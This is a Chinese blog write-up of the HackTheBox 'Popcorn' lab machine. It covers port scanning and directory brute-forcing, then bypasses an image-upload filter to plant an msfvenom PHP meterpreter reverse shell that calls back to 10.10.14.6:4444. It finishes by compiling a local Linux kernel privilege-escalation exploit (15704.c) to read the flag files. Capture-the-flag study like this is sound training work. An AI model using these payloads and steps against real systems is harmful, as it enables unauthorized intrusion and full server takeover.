---
title: HackTheBox-Popcorn
tags:
  - 靶机渗透
categories:
  - 技术水文
copyright: true
abbrlink: 111fdf1c
date: 2019-01-26 16:34:12
---

![](https://ae01.alicdn.com/kf/HTB17aKoaqWs3KVjSZFx761WUXXa4.png)
<!--more-->

## 目标 ##

在靶机中找到user.txt和root.txt文件

## 信息收集 ##

用nmap扫描端口信息

```bash
nmap -sC -sV 10.10.10.6
```
<!--more-->
```bash
┌─[root@parrot]─[~]
└──╼ #nmap -sC -sV 10.10.10.6
Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-16 13:29 EST
Nmap scan report for 10.10.10.6
Host is up (0.24s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.66 seconds
```

只开了`22`和`80`端口

先使用dirb爆破80端口web服务目录

```bash
dirb http://10.10.10.6/ -r
```

找到以下目录，其中`test`下是个phpinfo

![](https://ae01.alicdn.com/kf/HTB18uKeawmH3KVjSZKz7622OXXau.png)

![](https://ae01.alicdn.com/kf/HTB1bjelaBCw3KVjSZR0762cUpXa0.png)

`torrent` 文件夹比较可疑，浏览器访问`http://10.10.10.3/torrent/`

简单的浏览了下，发现有上传文件功能。先注册个帐号

![](https://ae01.alicdn.com/kf/HTB1rdWeawmH3KVjSZKz7622OXXaI.png)

完成注册后上传一个`.torrent`文件,上传成功后跳转到一下页面，点击`Edit this torrent`按钮，弹出一个可以上传图片的窗口

![](https://ae01.alicdn.com/kf/HTB1aCOgaBWD3KVjSZFs763qkpXaM.png)

先使用msf生成一个反向链接 payload，然后修改尾缀名为`.png`

```bash
msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.6 lport=4444 -f raw >test.php
mv test.php test.php.png
```

![](https://ae01.alicdn.com/kf/HTB1OLKlaBCw3KVjSZFl763JkFXat.png)

burp捉包删除尾缀名`.png`,然后上传

![](https://ae01.alicdn.com/kf/HTB1egCgaBaE3KVjSZLe760sSFXah.png)

找到上传文件所在目录，一般在`upload/`下

![](https://ae01.alicdn.com/kf/HTB1kmyeav5G3KVjSZPx762I3XXa1.png)

设置msf监听,然后浏览器打开上传的php `shell`脚本

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 10.10.14.6
set lport 4444
exploit

```

![](https://ae01.alicdn.com/kf/HTB1YYKhaBSD3KVjSZFq7634bpXat.png)

成功反弹shell

查看系统信息，linux内核为版本`2.6.31-14`，查找提权exp，这里使用`15704.c`进行编译提权获取shell会话。

```bash
searchsploit Linux 2.6.3
```
![](https://ae01.alicdn.com/kf/HTB1z4ifaEGF3KVjSZFo762mpFXau.png)

![](https://ae01.alicdn.com/kf/HTB1TgWfaEGF3KVjSZFo762mpFXad.png)

## 提权 ##

把exp上传到目标机上进行编译，提权，cat flag

```bash
upload /usr/share/exploitdb/exploits/linux/local/15704.c .
shell
ls
gcc 15704.c -o exp
chmod 777 exp && ./exp
./exp
ls /home
cat /home/george/user.txt
cat /root/root.txt

```

![](https://ae01.alicdn.com/kf/HTB1i91faA9E3KVjSZFG76319XXa7.png)